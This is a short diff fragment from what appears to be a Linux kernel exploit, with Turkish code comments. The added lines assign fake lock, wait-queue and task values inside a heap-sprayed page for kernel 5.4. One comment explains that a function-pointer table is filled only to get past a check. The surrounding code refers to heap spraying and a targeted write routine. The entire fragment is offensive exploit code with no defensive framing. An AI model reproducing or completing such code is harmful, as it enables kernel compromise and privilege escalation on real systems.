@@ -268,6 +268,12 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
       return 0;
     }
     pr_info("  [FPU] fp_helper_setup ok page_base=0x%zx pid=%d\n", page_base, fp_pid);
+    // FPU'nun hazirladigi yapiya gore degiskenleri ata
+    fake_lock = page_base;          // FP_LOCK_OFF = 0x00
+    fake_w0 = page_base + 0x40;     // FP_W_OFF = 0x40
+    fake_task = 0;                  // 5.4 icin 0
+    // fops FPU yonteminde kullanilmiyor, sadece kontrolu gecmek icin doldur
+    
   }
   TIMER("  heap spray done");
   run_main_route_threads();
